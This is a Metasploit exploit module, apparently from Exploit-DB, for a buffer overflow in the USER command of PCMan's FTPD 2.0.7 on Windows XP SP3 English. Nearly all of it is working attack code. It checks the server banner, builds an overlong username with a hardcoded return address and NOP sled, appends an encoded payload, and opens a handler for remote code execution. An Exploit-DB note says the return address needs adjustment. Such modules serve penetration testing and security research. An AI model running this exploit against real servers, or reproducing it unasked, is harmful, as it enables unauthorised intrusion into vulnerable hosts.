# Exploit-DB Note: Ret needs adjustment for Windows XP SP3 English

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PCMan\'s FTPD V2.0.7 Username Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow found in the USER command
				of PCMan's FTPD.
			},
			'Author'         => 'MSJ <matt.jones.85[at]gmail.com>',
			'License'        => MSF_LICENSE,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'    => 2005,
					'BadChars' => "\x53\x93\x42\x7E",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Target 0
					[
						'Windows XP SP3 English',
						{
							'Ret'      => 0x7e429353 # push esp, ret
						}
					]
				],
			'Default Target' => 0))
	end

	def check
		connect
		disconnect

		if (banner =~ /220 PCMan\'s FTP Server 2\.0 Ready\./)
			return Exploit::CheckCode::Vulnerable
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		sploit = 'USER ' + "\x41" * 2005 + [target.ret].pack('V') + make_nops(16) + payload.encoded
		
		send_cmd( [sploit] , false )

		handler
		disconnect
	end

end
